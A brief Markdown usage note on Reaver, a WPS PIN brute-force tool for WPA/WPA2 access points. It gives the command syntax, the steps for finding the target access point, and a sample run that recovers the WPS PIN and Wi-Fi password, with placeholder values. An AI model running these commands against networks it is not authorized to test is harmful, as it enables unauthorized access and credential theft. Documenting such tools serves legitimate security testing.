# Reaver

Reaver is a WPA/WPA2 brute force attack tool developed by Tactical Network Solutions. It exploits a vulnerability in the WPS (Wi-Fi Protected Setup) protocol found in WPA/WPA2 wireless access points.

## Usage

```bash
reaver -i <interface> -b <access-point> -v
```

To obtain the interface and access point, use the following commands:

```bash
iwconfig
iwlist <interface> scan
```

`Address` is what we are going to use in the `-b` flag.

```bash
./reaver -i wlan0 -b 02:00:00:00:01:00 -v

Reaver v1.6.4 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:01:00
[+] Received beacon from 02:00:00:00:01:00
[+] Trying pin "12345670"
[!] Found packet with bad FCS, skipping...
[+] Associated with 02:00:00:00:01:00 (ESSID: ID)
[+] WPS PIN: '12345670'
[+] WPA PSK: 'PASSWORD'
[+] AP SSID: 'ID'
```